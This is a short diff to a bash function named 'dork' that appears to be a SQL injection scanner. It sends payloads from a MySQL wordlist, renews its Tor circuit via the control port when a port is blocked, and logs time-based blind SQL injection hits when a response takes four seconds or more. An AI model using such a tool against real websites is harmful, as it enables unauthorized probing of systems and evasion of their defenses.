@@ -235,15 +235,11 @@ dork() {
             echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
             (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
             sleep 1
-          fi
-
-          if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
-            if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-              echo -e "[\033[34m${current_time}\033[0m] [\033[2;34m×\033[0m] \033[1mVector 1 confirmed MySQL Anomaly: ${stopwatch}s\033[0m"
-              echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
-            fi
-          fi
-
+          fi          
+if (( $(echo "$stopwatch >= 4.0" | bc -l) )); then
+  echo -e "[\033[34m${current_time}\033[0m] [\033[2;34m×\033[0m] \033[1mVector 1 confirmed MySQL Anomaly: ${stopwatch}s\033[0m"
+  echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
+fi
           sleep $((RANDOM % 6 + 4))
         done < <(shuf "$WORDLIST_MYSQL")
       }
